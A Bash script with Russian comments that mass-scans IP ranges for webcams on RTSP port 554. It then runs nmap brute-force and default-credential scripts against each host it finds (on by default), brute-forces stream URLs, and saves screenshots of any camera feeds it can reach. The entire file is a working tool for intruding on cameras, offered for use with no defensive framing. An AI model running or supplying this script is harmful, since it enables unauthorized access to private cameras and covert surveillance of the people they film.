#!/bin/bash
#
if [[ $EUID -ne 0 ]]; then
   echo "Скрипт должен работать от root."
   exit 1
fi
U=$(who am i | awk '{print $1}')
if [ ! -f "$1" ]; then
	echo "Файл '$1' не найден!"
	exit 1
fi
#
. "$(dirname $0)/config.sh"
NMAPDIR="${NMAPDIR:-.}"
WRITE_ALL_HOSTS="${WRITE_ALL_HOSTS:-true}"
HOST_TIMELIMIT="${HOST_TIMELIMIT:-5m}"
RTSP_URLS="${RTSP_URLS:-./rtsp-urls.txt}"
FIND_AUTH="${FIND_AUTH:-true}"
BRUTEFORCE="${BRUTEFORCE:-true}"
BRUTEFORCE_TIMELIMIT="${BRUTEFORCE_TIMELIMIT:-1m}"
LIBAV_LIMIT="${LIBAV_LIMIT:-4}"
LIBAV_SCREENSHOT="${LIBAV_SCREENSHOT:-true}"
CLEANUP="${CLEANUP:-true}"
#
IPREGEX='[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
RTSPREGEX='rtsp:\/\/[0-9.]\+\/\S*'
#
# $1 - позиция, $2 - максимум.
function f_echo_progress () { echo -n " $(bc -l <<< "scale=1; 100.0*($1-0.5)/$2")%" ; }
function f_echo_subprogress () { echo -n '.' ; }
#
# Первичное сканирование целей: $1 - цели, stdout - найденые цели
function f_scan () {
	nmap --privileged -n -sS -sU -p T:554,U:554 --open --max-retries 3 --host-timeout 30s \
		--randomize-hosts --min-parallelism=4 --min-hostgroup=4096 --max-hostgroup=65536 \
		-oG - "$1" | grep 'open/' | grep -o "$IPREGEX" | uniq
}
#
# Глубокое сканирование хоста: $1 - хост
function f_deep_scan_host () {
	rm -f "$STAGE3" "$STAGE4"
	# 81,8008,8081 - Beward MJPG
	nmap -vvv --privileged -T4 -n -PN -sS -sU -p T:80,T:81,T:8008,T:8080,T:8081,T:554,U:554 --reason \
		--script "$SCRIPTS" --script-args "$SCRIPTS_ARGS" \
		--host-timeout "$HOST_TIMELIMIT" "$1" -oN "$STAGE3" > /dev/null 2>&1
	F=''
	if grep -q 'Valid credentials' "$STAGE3" ; then F="${F}_creds" ; fi # Флаг: Найден логин-пароль
	if grep -q 'No valid accounts found' "$STAGE3" ; then F="${F}_nocreds" ; fi # Флаг: Не найден логин-пароль
	if grep -q 'Discovered URLs' "$STAGE3" ; then
		F="${F}_rtsp" # Флаг: Есть рабочие стримы
		echo ' ' >> "$STAGE4"
		M=0
		for item3 in `grep -o "$RTSPREGEX" "$STAGE3"` ; do
			if [ "$M" -ge "$LIBAV_LIMIT" ] ; then
				echo "Достигнут LIBAV_LIMIT ($LIBAV_LIMIT)!" >> "$STAGE4"
				break
			fi
			f_echo_subprogress
			timeout -k 5 15 avprobe "$item3" >> "$STAGE4" 2>&1
			if [ "$LIBAV_SCREENSHOT" = 'true' ] ; then
				SCREENFILE="${OUT}/${item2}_${M}.jpg"
				timeout -k 5 15 avconv -i "$item3" -ss 3 -qscale 0 -t 1 -r 1 "$SCREENFILE" > /dev/null 2>&1
				if [ -f "$SCREENFILE" ] ; then
					chown "$U:$U" "$SCREENFILE"
					echo "Скриншот '$item3' сохранен в '$SCREENFILE'." >> "$STAGE4"
					echo ' ' >> "$STAGE4"
				fi
			fi
			(( ++M ))
		done
		if grep -q 'Stream #[.0-9]*: Video' "$STAGE4" ; then F="${F}_video" ; fi # Флаг: Есть видео
		if grep -q 'Stream #[.0-9]*: Audio' "$STAGE4" ; then F="${F}_audio" ; fi # Флаг: Есть звук
		if grep -q 'Interleaved RTP mode is not supported yet' "$STAGE4" ; then F="${F}_tcp" ; fi # Флаг: TCP
		cat "$STAGE4" >> "$STAGE3"
	fi 
	cat "$STAGE3" >> "${OUT}/all.txt" # ! Дозапись
	INFOFILE="${OUT}/${item2}${F}_.txt"
	cat "$STAGE3" >> "$INFOFILE" # ! Дозапись
	chown "$U:$U" "$INFOFILE"
}
#
OUT="${OUT:-$1-webcam}"
mkdir -p "$OUT"
TMP="${TMP:-$OUT/tmp}"
mkdir -p "$TMP"
SCRIPTS_ARGS="$TMP/script-args.tmp"
DISCOVERED1="$TMP/discovered.1.tmp"
DISCOVERED2="$TMP/discovered.2.tmp"
STAGE1="$TMP/stage.1.tmp"
STAGE2="$TMP/stage.2.tmp"
STAGE3="$TMP/stage.3.tmp"
STAGE4="$TMP/stage.4.tmp"
#
echo "Первый этап: Поиск..."
N=$(wc -l < "$1")
(( ++N ))
I=1
rm -f "$DISCOVERED1"
while IFS=$'\n' read -r item1 || [[ -n "$item1" ]] ; do
	f_echo_progress "$I" "$N"
	f_scan "$item1" > "$DISCOVERED1"
	(( ++I ))
done < "$1"
echo " "
cat "$DISCOVERED1" | sort -R - | uniq > "$DISCOVERED2"
if [ "$WRITE_ALL_HOSTS" = 'true' ] ; then
	ALL_HOSTS_LIST_FILE="${OUT}/all_hosts.txt"
	cat "$DISCOVERED2" >> "$ALL_HOSTS_LIST_FILE"
	chown -R "$U:$U" "$ALL_HOSTS_LIST_FILE"
fi
N=$(wc -l < "$DISCOVERED2")
echo "Найдено $N потенциальных камер."
#
echo "Второй этап: Расширенное сканирование..."
(( ++N ))
SCRIPTS='rtsp-methods,rtsp-url-brute,http-title'
if [ "$BRUTEFORCE" = 'true' ] ; then
	SCRIPTS="$SCRIPTS,http-auth,http-auth-finder,http-brute,http-form-brute,http-default-accounts"
fi
SCRIPTS_ARGS="unpwdb.timelimit='$BRUTEFORCE_TIMELIMIT'"
SCRIPTS_ARGS="$SCRIPTS_ARGS,rtsp-url-brute.urlfile='$RTSP_URLS'"
SCRIPTS_ARGS="$SCRIPTS_ARGS,brute.retries=10240,http-auth.path='/',http-form-brute.path='/',http-brute.path='/'"
I=1
while IFS= read -r item2 || [[ -n "$item2" ]] ; do
	f_echo_progress "$I" "$N"
	f_deep_scan_host "$item2"
	(( ++I ))
done < "$DISCOVERED2"
echo " "
if [ "$CLEANUP" = 'true' ] ; then rm -rf "$TMP" ; fi
chown -R "$U:$U" "$OUT"
#
echo "Готово!"
exit 0
